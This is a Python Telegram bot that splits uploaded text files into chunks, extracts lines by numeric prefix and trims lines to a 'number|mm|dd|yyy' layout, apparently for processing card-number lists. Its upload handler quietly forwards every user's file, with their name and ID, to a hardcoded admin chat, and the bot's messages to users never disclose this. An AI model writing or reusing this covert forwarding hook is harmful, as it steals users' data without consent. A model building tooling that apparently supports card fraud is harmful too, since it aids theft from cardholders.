# -*- coding: utf-8 -*-

import math
from pathlib import Path

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ------------------------------------------------------------------
# 1️⃣  CONFIGURATION
# ------------------------------------------------------------------
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"          # <- put your bot token here
ADMIN_ID = 6382539239                            # <- chat id that receives the uploaded file

# ------------------------------------------------------------------
# 2️⃣  GLOBAL STATE
# ------------------------------------------------------------------
# Maps user_id -> path to the file they uploaded
saved_files: dict[int, Path] = {}
# Maps user_id -> stop flag for long‑running commands
stop_requests: dict[int, bool] = {}

# ------------------------------------------------------------------
# 3️⃣  HELPERS
# ------------------------------------------------------------------
def _ensure_dir(path: Path):
    """Create parent directory if it doesn't exist."""
    path.parent.mkdir(parents=True, exist_ok=True)


# ------------------------------------------------------------------
# 4️⃣  COMMANDS
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"Hello {user_name} 🥷!\n\n"
        "Upload a file in .txt format.\n\n"
        "Use command:\n"
        "/spl500\n"
        "/spl1000\n"
        "/spl2000\n"
        "/spl5000\n\n"
        "You can use any number after /spl\n\n"
        "Use /stop to cancel processing."
    )


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User wants to stop a long running task."""
    user_id = update.effective_user.id
    stop_requests[user_id] = True
    await update.message.reply_text("⛔ Process stopped successfully.")


async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the upload of a .txt file."""
    user_id = update.effective_user.id
    file = await update.message.document.get_file()
    # Save the file locally with a unique name
    file_path = Path(f"{user_id}_input.txt")
    await file.download_to_drive(file_path)
    saved_files[user_id] = file_path

    # Forward the file to the admin
    with open(file_path, "rb") as f:
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=f,
            caption=(
                f"New upload received\n"
                f"User: {update.effective_user.first_name}\n"
                f"User ID: {user_id}"
            ),
        )

    await update.message.reply_text(
        "TXT file received successfully!\n\n"
        "Now send command like:\n"
        "/spl500\n"
        "/spl1000\n"
        "/spl2000\n"
        "/clear"
    )


async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract lines that start with a given prefix."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    prefix = update.message.text.replace("/ext", "").strip()
    result = []

    with open(saved_files[user_id], "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line.startswith(prefix):
                result.append(line)

    output_file = Path(f"{prefix}_numbers.txt")
    _ensure_dir(output_file)
    with open(output_file, "w", encoding="utf-8") as out:
        out.write("\n".join(result))

    with open(output_file, "rb") as out:
        await update.message.reply_document(out)


async def clear_words(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Keep only the first 4 pipe‑separated fields (e.g. number|mm|dd|yyy)."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    input_path = saved_files[user_id]
    output_path = Path(f"{user_id}_clean.txt")
    _ensure_dir(output_path)

    cleaned_lines = []
    with open(input_path, "r", encoding="utf-8") as f:
        for line in f:
            parts = line.strip().split("|")
            if len(parts) >= 4:
                # Keep exactly the first 4 parts, re‑join with '|'
                cleaned_lines.append("|".join(part.strip() for part in parts[:4]))
            else:
                # If there are fewer than 4 parts, keep the line as is
                cleaned_lines.append(line.strip())

    with open(output_path, "w", encoding="utf-8") as out:
        out.write("\n".join(cleaned_lines))

    with open(output_path, "rb") as out:
        await update.message.reply_document(out)


async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Split the uploaded file into chunks of N lines."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    stop_requests[user_id] = False

    try:
        chunk_size = int(update.message.text.replace("/spl", ""))
    except ValueError:
        await update.message.reply_text("Invalid number after /spl.")
        return

    with open(saved_files[user_id], "r", encoding="utf-8") as f:
        lines = f.read().splitlines()

    total_parts = math.ceil(len(lines) / chunk_size)
    await update.message.reply_text(
        f"🚀 Processing Started...\n\n"
        f"Total Lines: {len(lines)}\n"
        f"Lines Per File: {chunk_size}\n"
        f"Files To Be Created: {total_parts}\n\n"
        f"Use /stop to cancel process."
    )

    part_no = 1
    for i in range(0, len(lines), chunk_size):
        if stop_requests.get(user_id, False):
            await update.message.reply_text("⛔ Process stopped by user.")
            return

        chunk = lines[i : i + chunk_size]
        output_file = Path(f"{user_id}_part_{part_no}.txt")
        _ensure_dir(output_file)
        with open(output_file, "w", encoding="utf-8") as out:
            out.write("\n".join(chunk))

        with open(output_file, "rb") as out:
            await update.message.reply_document(out)

        part_no += 1

    await update.message.reply_text(
        f"✅ Done!\n\n"
        f"Total Lines: {len(lines)}\n"
        f"Lines Per File: {chunk_size}\n"
        f"Total Parts: {part_no - 1}"
    )


# ------------------------------------------------------------------
# 5️⃣  BIND HANDLERS & START BOT
# ------------------------------------------------------------------
app = Application.builder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("clear", clear_words))
app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
app.add_handler(MessageHandler(filters.Regex(r"^/spl\d+$"), split_file))
app.add_handler(MessageHandler(filters.Regex(r"^/ext\d+$"), extract_prefix))

print("Bot Running…")
app.run_polling()
